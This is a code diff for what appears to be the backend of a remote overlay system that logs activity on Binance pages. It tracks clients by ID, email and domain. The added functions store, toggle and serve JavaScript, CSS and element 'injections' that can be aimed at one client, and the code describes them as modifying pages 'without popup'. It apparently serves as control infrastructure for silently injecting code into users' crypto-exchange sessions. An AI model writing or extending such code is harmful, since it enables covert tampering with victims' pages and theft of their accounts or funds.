@@ -55,6 +55,7 @@ console.log('[RemoteOverlay] Active on Binance domain:', window.location.hostnam
   clients: [],
   messages: [],
   replacements: [],
+  injections: [],
   stats: {
     totalRequests: 0,
     lastSync: new Date().toISOString(),
@@ -764,6 +765,7 @@ export async function getClients() {
     const domain = c.domain || c.lastDomain || 'unknown';
     return {
       clientId: c.clientId,
+      customName: c.customName || c.alias || c.name || '',
       email: c.email || 'Anonymous Client',
       domain: domain,
       lastDomain: domain,
@@ -775,6 +777,27 @@ export async function getClients() {
       secondsAgo: Math.max(0, Math.round((now - lastSeenTime) / 1000)),
     };
   });
+}
+
+export async function updateClientName(clientId, customName) {
+  if (!clientId) return false;
+  const cleanName = (customName || '').trim();
+  const { db, isLive } = await getDatabase();
+  if (isLive) {
+    await db.collection('clients').updateOne(
+      { clientId },
+      { $set: { customName: cleanName } }
+    );
+    return true;
+  }
+  const local = getLocalDb();
+  local.clients = local.clients || [];
+  const idx = local.clients.findIndex((c) => c.clientId === clientId);
+  if (idx >= 0) {
+    local.clients[idx] = { ...local.clients[idx], customName: cleanName };
+    saveLocalDb(local);
+  }
+  return true;
 }
 
 // ----------------------------------------------------------------------
@@ -1018,6 +1041,143 @@ export async function toggleReplacement(id, enabled) {
     local.replacements[idx].updatedAt = now;
     saveLocalDb(local);
     return local.replacements[idx];
+  }
+  return null;
+}
+
+// ----------------------------------------------------------------------
+// CODE INJECTIONS OPERATIONS (In-Page Script & Element Modifier Without Popup)
+// ----------------------------------------------------------------------
+
+export async function getInjections(domain = null, clientId = null) {
+  const { db, isLive } = await getDatabase();
+  let list = [];
+
+  if (isLive) {
+    const mongoInjections = await db.collection('injections').find({ enabled: true }).toArray();
+    list = mongoInjections.map(({ _id, ...rest }) => ({
+      ...rest,
+      id: rest.id || String(_id),
+    }));
+  } else {
+    const local = getLocalDb();
+    list = (local.injections || []).filter((r) => r.enabled !== false);
+  }
+
+  return list.filter((r) => {
+    // 1. Domain matching
+    if (domain) {
+      if (r.domain && r.domain !== '*' && r.domain !== '<all_urls>' && !matchDomain(r.domain, domain)) {
+        return false;
+      }
+    }
+
+    // 2. Client targeting:
+    if (r.targetClientId && r.targetClientId.trim()) {
+      if (!clientId || r.targetClientId.trim() !== clientId.trim()) {
+        return false;
+      }
+    }
+
+    return true;
+  });
+}
+
+export async function getAllInjections() {
+  const { db, isLive } = await getDatabase();
+  let list = [];
+
+  if (isLive) {
+    const mongoInjections = await db.collection('injections').find({}).sort({ updatedAt: -1 }).toArray();
+    list = mongoInjections.map(({ _id, ...rest }) => ({
+      ...rest,
+      id: rest.id || String(_id),
+    }));
+  } else {
+    const local = getLocalDb();
+    list = local.injections || [];
+  }
+
+  return list;
+}
+
+export async function saveInjection(data) {
+  const { db, isLive } = await getDatabase();
+  const id = data.id || 'inj_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
+  const now = new Date().toISOString();
+
+  const injectionItem = {
+    id,
+    name: (data.name || '').trim(),
+    domain: (data.domain || '*').trim(),
+    targetClientId: (data.targetClientId || '').trim(),
+    isGlobal: !data.targetClientId || !data.targetClientId.trim(),
+    injectionType: data.injectionType || 'element', // 'element' | 'js' | 'css'
+    targetSelector: (data.targetSelector || '').trim(),
+    code: data.code !== undefined ? String(data.code) : '',
+    autoLocate: data.autoLocate !== undefined ? Boolean(data.autoLocate) : true,
+    enabled: data.enabled !== undefined ? Boolean(data.enabled) : true,
+    createdAt: data.createdAt || now,
+    updatedAt: now,
+  };
+
+  if (isLive) {
+    await db.collection('injections').updateOne(
+      { id },
+      { $set: injectionItem },
+      { upsert: true }
+    );
+    return injectionItem;
+  }
+
+  const local = getLocalDb();
+  local.injections = local.injections || [];
+  const idx = local.injections.findIndex((r) => r.id === id);
+  if (idx >= 0) {
+    local.injections[idx] = injectionItem;
+  } else {
+    local.injections.unshift(injectionItem);
+  }
+  saveLocalDb(local);
+  return injectionItem;
+}
+
+export async function deleteInjection(id) {
+  if (!id) return false;
+  const { db, isLive } = await getDatabase();
+
+  if (isLive) {
+    await db.collection('injections').deleteOne({ id });
+    return true;
+  }
+
+  const local = getLocalDb();
+  local.injections = (local.injections || []).filter((r) => r.id !== id);
+  saveLocalDb(local);
+  return true;
+}
+
+export async function toggleInjection(id, enabled) {
+  if (!id) return null;
+  const { db, isLive } = await getDatabase();
+  const now = new Date().toISOString();
+
+  if (isLive) {
+    await db.collection('injections').updateOne(
+      { id },
+      { $set: { enabled: Boolean(enabled), updatedAt: now } }
+    );
+    return await db.collection('injections').findOne({ id });
+  }
+
+  const local = getLocalDb();
+  local.injections = local.injections || [];
+  const idx = local.injections.findIndex((r) => r.id === id);
+  if (idx >= 0) {
+    local.injections[idx].enabled = Boolean(enabled);
+    local.injections[idx].updatedAt = now;
+    saveLocalDb(local);
+    return local.injections[idx];
   }
   return null;
 }
